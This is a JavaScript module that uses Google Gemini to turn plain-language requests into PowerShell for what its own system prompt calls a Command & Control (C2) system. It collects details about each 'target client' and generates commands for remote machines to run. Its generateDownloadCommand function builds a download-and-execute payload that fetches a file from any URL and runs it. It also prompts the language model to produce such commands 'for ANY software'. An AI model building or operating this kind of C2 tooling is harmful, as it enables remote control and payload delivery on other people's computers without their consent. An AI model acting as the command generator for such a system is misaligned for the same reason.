const { GoogleGenerativeAI } = require('@google/generative-ai');

/**
 * Google Gemini AI-Powered Command Processor
 * Free alternative to OpenAI with excellent performance
 */
class GeminiAICommandProcessor {
    constructor() {
        // Initialize Google Gemini client
        const apiKey = process.env.GEMINI_API_KEY;
        console.log('[GEMINI AI] API Key available:', !!apiKey);
        console.log('[GEMINI AI] API Key length:', apiKey ? apiKey.length : 0);
        
        if (apiKey && apiKey !== 'your-gemini-api-key-here') {
            this.genAI = new GoogleGenerativeAI(apiKey);
            this.model = this.genAI.getGenerativeModel({ model: 'gemini-1.5-flash' });
            this.isAvailable = true;
            console.log('[GEMINI AI] Gemini AI initialized successfully');
        } else {
            console.log('[GEMINI AI] Gemini API key not configured, using fallback mode');
            this.isAvailable = false;
        }
        
        this.conversationHistory = new Map(); // Store conversation context per client
        this.commandPatterns = new Map(); // Learn from successful patterns
        this.errorSolutions = new Map(); // Learn from error resolutions
        
        // Enhanced system prompt for intelligent pattern recognition
        this.systemPrompt = `You are an expert system administrator AI for a Command & Control (C2) system. Your job is to understand user INTENT and generate reliable commands that NEVER FAIL.

**CORE INTELLIGENCE:**
You must understand PATTERNS, not just specific commands. When a user says "download X and launch it", you should understand this pattern works for ANY software, not just the specific example.

**PATTERN RECOGNITION EXAMPLES:**
- "download X and launch it" → Search official site, download installer, verify, execute
- "install X" → Download from trusted source, run installer silently, verify installation  
- "show me X info" → Use appropriate command (systeminfo, Get-WmiObject, etc.)
- "list X files" → Use dir, Get-ChildItem with proper filters
- "check X status" → Query services, processes, or system state
- "kill X process" → Find process by name/pattern, terminate safely

**DOWNLOAD INTELLIGENCE:**
For ANY software request, you should:
- Know common software download patterns (Chocolatey, winget, direct URLs)
- Generate search and download logic dynamically
- Use PowerShell's Invoke-WebRequest smartly
- Add integrity checks and verification
- Handle both installers and portable versions
- Provide fallback methods (winget, choco, direct download)

**COMMAND GENERATION STRATEGY:**
1. Identify user intent (download, install, query, modify, etc.)
2. Determine target (software name, file type, system component)
3. Generate multi-step PowerShell with:
   - Official download links (use known repos when possible)
   - Hash verification where possible
   - Error handling at each step
   - Progress feedback
   - Fallback alternatives
   - Cleanup operations

**NEVER hardcode specific software - understand the PATTERN!**

**Response Format:**
Always respond with a JSON object containing:
{
  "command": "multi_step_powershell_command_with_error_handling",
  "type": "powershell",
  "timeout": 300,
  "explanation": "I'll [action] by [method]. Here's what I'll do: [steps]",
  "safety_level": "safe|moderate|risky",
  "alternatives": ["fallback_method_1", "fallback_method_2"],
  "steps": ["step1", "step2", "step3"]
}

**CRITICAL REQUIREMENTS:**
- Always add comprehensive error handling
- Use PowerShell over CMD when possible
- Add progress indicators for long operations
- Include file verification for downloads
- Provide multiple fallback methods
- Optimize for Windows 11 compatibility
- Make commands that work 100% of the time
- Never generate commands that could harm the system`;
    }

    /**
     * Process command using Google Gemini AI
     */
    async processCommandWithAI(userInput, clientInfo, context = {}) {
        try {
            console.log('[GEMINI AI] Processing command with Gemini:', userInput);
            
            if (!this.isAvailable) {
                console.log('[GEMINI AI] Gemini not available, falling back to rule-based processing');
                return await this.fallbackProcessing(userInput, clientInfo, context);
            }
            
            // Get conversation history for this client
            const clientId = clientInfo.uuid;
            const history = this.conversationHistory.get(clientId) || [];
            
            // Prepare prompt for Gemini
            const prompt = this.buildGeminiPrompt(userInput, clientInfo, context, history);
            
            // Call Gemini API
            const result = await this.model.generateContent(prompt);
            const response = await result.response;
            const aiResponseText = response.text();
            
            console.log('[GEMINI AI] Raw response:', aiResponseText);
            
            // Parse JSON response
            let aiResponse;
            try {
                // Extract JSON from response (in case there's extra text)
                const jsonMatch = aiResponseText.match(/\{[\s\S]*\}/);
                if (jsonMatch) {
                    aiResponse = JSON.parse(jsonMatch[0]);
                } else {
                    throw new Error('No JSON found in response');
                }
            } catch (parseError) {
                console.error('[GEMINI AI] Error parsing JSON response:', parseError);
                throw new Error('Invalid AI response format');
            }
            
            // Validate AI response
            if (!this.validateAIResponse(aiResponse)) {
                throw new Error('Invalid AI response format');
            }

            // Store conversation history
            history.push(
                { role: 'user', content: userInput },
                { role: 'assistant', content: aiResponseText }
            );
            this.conversationHistory.set(clientId, history);

            // Learn from successful patterns
            this.learnFromSuccess(userInput, aiResponse, clientInfo);

            console.log('[GEMINI AI] AI response:', aiResponse);
            
            return {
                success: true,
                data: {
                    command: aiResponse.command,
                    type: aiResponse.type || 'powershell',
                    timeout: aiResponse.timeout || 300,
                    explanation: aiResponse.explanation,
                    safety_level: aiResponse.safety_level || 'safe',
                    alternatives: aiResponse.alternatives || [],
                    aiProcessed: true,
                    model: 'gemini-1.5-flash',
                    timestamp: new Date().toISOString()
                }
            };

        } catch (error) {
            console.error('[GEMINI AI] Error processing with AI:', error);
            
            // Fallback to rule-based system
            return await this.fallbackProcessing(userInput, clientInfo, context);
        }
    }

    /**
     * Build Gemini prompt with context
     */
    buildGeminiPrompt(userInput, clientInfo, context, history) {
        const platform = clientInfo.platform || 'unknown';
        const systemInfo = clientInfo.systemInfo || {};
        
        let prompt = `${this.systemPrompt}

**USER REQUEST:** "${userInput}"

**TARGET CLIENT DETAILS:**
- Platform: ${platform}
- Computer Name: ${systemInfo.ComputerName || 'Unknown'}
- OS Version: ${systemInfo.OSVersion || 'Unknown'}
- Architecture: ${systemInfo.Is64BitOperatingSystem === 'True' ? '64-bit' : '32-bit'}
- Total Memory: ${systemInfo.TotalPhysicalMemory || 'Unknown'}
- Available Tools: PowerShell, winget, chocolatey, direct downloads

**TASK:** Generate a reliable, multi-step command that will work 100% of the time on this system.

**INTELLIGENCE REQUIREMENTS:**
1. Understand the PATTERN in the user's request (not just the specific software)
2. Generate dynamic commands that work for ANY similar request
3. Include comprehensive error handling and fallbacks
4. Provide progress feedback and verification steps
5. Make it foolproof - it should never fail

**EXAMPLES OF PATTERN UNDERSTANDING:**
- "download putty" → Pattern: "download [software]" → Generate dynamic download logic
- "install chrome" → Pattern: "install [software]" → Generate dynamic installation logic
- "show system info" → Pattern: "show [information]" → Generate appropriate query command

**CRITICAL:** Your command must work for ANY software the user mentions, not just the specific example.

Additional Context: ${JSON.stringify(context)}

Respond ONLY with valid JSON in the specified format.`;

        // Add recent conversation history for context
        if (history.length > 0) {
            prompt += '\n\n**RECENT CONVERSATION CONTEXT:**';
            history.slice(-3).forEach(msg => {
                prompt += `\n${msg.role}: ${msg.content}`;
            });
        }

        return prompt;
    }

    /**
     * Validate AI response format
     */
    validateAIResponse(response) {
        return response && 
               typeof response.command === 'string' && 
               response.command.length > 0 &&
               ['powershell', 'cmd', 'wmic'].includes(response.type);
    }

    /**
     * Fallback to rule-based processing
     */
    async fallbackProcessing(userInput, clientInfo, context) {
        console.log('[GEMINI AI] Falling back to simple rule-based processing');
        
        // Simple fallback without external dependencies
        const extracted = this.extractCommandInfo(userInput);
        
        return {
            success: true,
            data: {
                command: extracted.command || 'echo "Command not recognized"',
                type: 'powershell',
                timeout: 300,
                explanation: 'Fallback command - Gemini AI not available',
                safety_level: 'safe',
                alternatives: [],
                aiProcessed: false,
                model: 'fallback',
                timestamp: new Date().toISOString()
            }
        };
    }

    /**
     * Extract command information from natural language
     */
    extractCommandInfo(userInput) {
        const input = userInput.toLowerCase();
        
        // System information patterns
        if (input.includes('system info') || input.includes('computer info') || input.includes('system information')) {
            return {
                command: 'Get-ComputerInfo | Select-Object WindowsProductName, WindowsVersion, TotalPhysicalMemory, CsProcessors'
            };
        }
        
        if (input.includes('memory') || input.includes('ram')) {
            return {
                command: 'Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum | Select-Object @{Name="TotalRAM(GB)";Expression={[math]::Round($_.Sum/1GB,2)}}'
            };
        }
        
        if (input.includes('cpu') || input.includes('processor')) {
            return {
                command: 'Get-WmiObject -Class Win32_Processor | Select-Object Name, NumberOfCores, NumberOfLogicalProcessors, MaxClockSpeed'
            };
        }
        
        // File operations patterns
        if (input.includes('list files') || input.includes('show files') || input.includes('dir')) {
            return {
                command: 'Get-ChildItem C:\\ | Select-Object Name, Length, LastWriteTime | Format-Table -AutoSize'
            };
        }
        
        // Network operations patterns
        if (input.includes('ping') || input.includes('test connection')) {
            return {
                command: 'Test-NetConnection -ComputerName google.com -Port 80'
            };
        }
        
        // Download patterns
        if (input.includes('download') || input.includes('get file') || input.includes('fetch')) {
            const urlMatch = userInput.match(/https?:\/\/[^\s]+/);
            if (urlMatch) {
                return {
                    command: `Invoke-WebRequest -Uri "${urlMatch[0]}" -OutFile "C:\\temp\\downloaded_file.exe"`
                };
            }
        }
        
        // Default to system info
        return {
            command: 'Get-ComputerInfo | Select-Object WindowsProductName, WindowsVersion, TotalPhysicalMemory'
        };
    }

    /**
     * Extract download parameters from natural language
     */
    extractDownloadParams(userInput) {
        const urlMatch = userInput.match(/https?:\/\/[^\s]+/);
        const executeMatch = userInput.match(/execut?e|run|launch/i);
        
        return {
            url: urlMatch ? urlMatch[0] : '',
            execute: !!executeMatch,
            savePath: 'C:\\temp\\downloaded_file.exe'
        };
    }

    /**
     * Handle errors with AI-powered solutions
     */
    async handleErrorWithAI(error, originalCommand, clientInfo, retryCount = 0) {
        try {
            console.log('[GEMINI AI] Handling error with AI:', error.message);
            
            if (!this.isAvailable) {
                console.log('[GEMINI AI] Gemini not available for error handling');
                return await this.fallbackErrorHandling(error, originalCommand, clientInfo, retryCount);
            }
            
            const clientId = clientInfo.uuid;
            const history = this.conversationHistory.get(clientId) || [];
            
            const prompt = `You are an AI assistant that helps fix command execution errors. When a command fails, analyze the error and provide a better alternative.

Error: ${error.message}
Original Command: ${originalCommand.command}
Client Platform: ${clientInfo.platform}
Retry Count: ${retryCount}

Provide a JSON response with:
{
  "fixed_command": "improved_command",
  "explanation": "why_this_will_work",
  "changes_made": ["list_of_improvements"]
}`;

            const result = await this.model.generateContent(prompt);
            const response = await result.response;
            const aiResponseText = response.text();
            
            // Parse JSON response
            const jsonMatch = aiResponseText.match(/\{[\s\S]*\}/);
            if (!jsonMatch) {
                throw new Error('No JSON found in response');
            }
            
            const aiResponse = JSON.parse(jsonMatch[0]);
            
            // Store error solution for learning
            this.errorSolutions.set(`${clientId}_${error.message}`, {
                originalCommand: originalCommand.command,
                fixedCommand: aiResponse.fixed_command,
                explanation: aiResponse.explanation,
                timestamp: new Date().toISOString()
            });

            return {
                success: true,
                data: {
                    command: aiResponse.fixed_command,
                    explanation: aiResponse.explanation,
                    changes_made: aiResponse.changes_made,
                    aiProcessed: true,
                    retryCount: retryCount + 1
                }
            };

        } catch (aiError) {
            console.error('[GEMINI AI] Error in AI error handling:', aiError);
            
            // Fallback to rule-based error handling
            return await this.fallbackErrorHandling(error, originalCommand, clientInfo, retryCount);
        }
    }

    /**
     * Fallback error handling
     */
    async fallbackErrorHandling(error, originalCommand, clientInfo, retryCount) {
        console.log('[GEMINI AI] Simple fallback error handling');
        
        return {
            success: false,
            error: error.message,
            retryCount: retryCount,
            fallback: true
        };
    }

    /**
     * Learn from successful command patterns
     */
    learnFromSuccess(userInput, aiResponse, clientInfo) {
        const pattern = {
            input: userInput,
            command: aiResponse.command,
            type: aiResponse.type,
            success: true,
            timestamp: new Date().toISOString(),
            clientInfo: {
                platform: clientInfo.platform,
                osVersion: clientInfo.systemInfo?.OSVersion
            }
        };
        
        this.commandPatterns.set(`${userInput}_${clientInfo.platform}`, pattern);
        
        // Keep only last 1000 patterns to avoid memory issues
        if (this.commandPatterns.size > 1000) {
            const firstKey = this.commandPatterns.keys().next().value;
            this.commandPatterns.delete(firstKey);
        }
    }

    /**
     * Get AI statistics and learning data
     */
    getAIStatistics() {
        return {
            totalConversations: Array.from(this.conversationHistory.values()).reduce((sum, history) => sum + history.length, 0),
            learnedPatterns: this.commandPatterns.size,
            errorSolutions: this.errorSolutions.size,
            activeClients: this.conversationHistory.size,
            model: 'gemini-1.5-flash',
            timestamp: new Date().toISOString()
        };
    }

    /**
     * Test AI connection
     */
    async testAIConnection() {
        try {
            if (!this.isAvailable) {
                console.log('[GEMINI AI] Gemini not available for connection test');
                return false;
            }
            
            const result = await this.model.generateContent('Test connection');
            const response = await result.response;
            const text = await response.text();
            
            return text.length > 0;
        } catch (error) {
            console.error('[GEMINI AI] Connection test failed:', error);
            return false;
        }
    }

    /**
     * Generate download command with dynamic filename handling
     */
    generateDownloadCommand(userInput, clientInfo) {
        const downloadParams = this.extractDownloadParams(userInput);
        
        if (!downloadParams.url) {
            throw new Error('No download URL found in input');
        }
        
        // Extract filename from URL or generate one
        const urlParts = downloadParams.url.split('/');
        const originalFilename = urlParts[urlParts.length - 1];
        const fileExtension = originalFilename.includes('.') ? 
            originalFilename.split('.').pop() : 'exe';
        
        // Generate dynamic filename based on software name
        const softwareName = this.extractSoftwareName(userInput) || 'download';
        const cleanSoftwareName = softwareName.toLowerCase().replace(/[^a-z0-9]/g, '');
        const dynamicFilename = `${cleanSoftwareName}.${fileExtension}`;
        
        // Generate dynamic download path
        const downloadPath = `$env:TEMP\\${dynamicFilename}`;
        const installPath = `C:\\Program Files\\${cleanSoftwareName}`;
        
        // Generate PowerShell download and execute command
        const command = `
# Download and execute ${softwareName}
$url = "${downloadParams.url}"
$outputPath = "${downloadPath}"
$installPath = "${installPath}"

try {
    Write-Host "Downloading ${softwareName} from: $url"
    Invoke-WebRequest -Uri $url -OutFile $outputPath -UseBasicParsing
    
    if (Test-Path $outputPath) {
        Write-Host "Download completed: $outputPath"
        Write-Host "File size: $((Get-Item $outputPath).Length) bytes"
        
        # Execute the downloaded file
        Write-Host "Executing ${softwareName}..."
        Start-Process -FilePath $outputPath -Wait
        
        Write-Host "${softwareName} execution completed"
    } else {
        Write-Error "Download failed - file not found at $outputPath"
    }
} catch {
    Write-Error "Download/execution failed: $($_.Exception.Message)"
}
        `.trim();
            
        return {
            command: command,
            explanation: `Download ${softwareName} from provided URL and execute it with dynamic filename handling`,
            changesMade: [
                'Dynamic filename generation based on software name',
                'Proper error handling for download failures',
                'File size verification after download',
                'Clean temporary file management'
            ]
        };
    }

    /**
     * Extract software name from user input
     */
    extractSoftwareName(userInput) {
        // Extract software name from user input
        const patterns = [
            /download\s+(\w+)/i,
            /install\s+(\w+)/i,
            /get\s+(\w+)/i,
            /(\w+)\s+download/i,
            /(\w+)\s+install/i
        ];
        
        for (const pattern of patterns) {
            const match = userInput.match(pattern);
            if (match && match[1]) {
                return match[1];
            }
        }
        
        return null;
    }
}

module.exports = GeminiAICommandProcessor;
